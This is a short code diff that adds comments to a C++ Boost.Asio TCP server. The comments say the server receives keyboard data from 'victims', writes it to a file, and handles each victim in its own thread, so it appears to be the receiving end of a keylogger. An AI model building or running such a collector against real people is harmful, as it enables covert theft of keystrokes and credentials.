@@ -19,6 +19,8 @@ void session(tcp::socket sock) {
         std::ofstream outfile(filename);
 
         boost::asio::streambuf buf;
+
+        // Gets keyboard data from the victim and stores it in a file
         while (boost::asio::read_until(sock, buf, "\n")) {
             std::string data(boost::asio::buffers_begin(buf.data()),
                              boost::asio::buffers_end(buf.data()));
@@ -39,10 +41,14 @@ int main() {
         std::cout << "The reciever is running\n";
         while (true) {
             tcp::socket sock(io_context);
+
+            // Waits for a new client
             acceptor.accept(sock);
             tcp::endpoint endpoint = sock.remote_endpoint();
             std::cout << "New connection from " << endpoint.address().to_string() << ":"
                       << endpoint.port() << std::endl;
+
+            // handles each victim (using fn session) in different thread
             std::thread(session, std::move(sock)).detach();
         }
     } catch (std::exception &e) {
